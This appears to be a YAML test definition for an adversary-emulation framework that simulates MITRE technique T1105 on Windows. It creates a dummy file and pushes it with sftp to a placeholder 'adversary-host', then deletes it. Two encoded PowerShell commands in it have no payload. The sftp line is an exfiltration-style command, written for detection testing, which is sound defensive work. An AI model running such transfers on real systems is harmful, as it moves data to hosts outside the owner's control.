- id: 6ef7eb81-fb34-5875-9864-30881b3dd97b
  name: Soumaia ART Tests - Windows push file using sftp.exe
  description: This test simulates pushing files using SFTP on a Windows environment. (requires elevation)
  tactic: command-and-control
  technique:
    attack_id: T1105
    name: Ingress Tool Transfer
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand 
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          # Check if the folder exists, create it if it doesn't
          $folderPath = "C:\temp"
          if (-Not (Test-Path -Path $folderPath)) {
              New-Item -Path $folderPath -ItemType Directory
          }
          # Create the file
          $filePath = Join-Path -Path $folderPath -ChildPath "T1105.txt"
          New-Item -Path $filePath -ItemType File -Force
          Write-Output "File created: $filePath"
          # Attack command
          echo "put C:\temp\T1105.txt" | sftp adversary@adversary-host:/tmp
        cleanup: |-
          $filePath = Join-Path -Path "C:\temp" -ChildPath "T1105.txt"
          Remove-Item -Path $filePath -Force
          Write-Output "File deleted: $filePath"
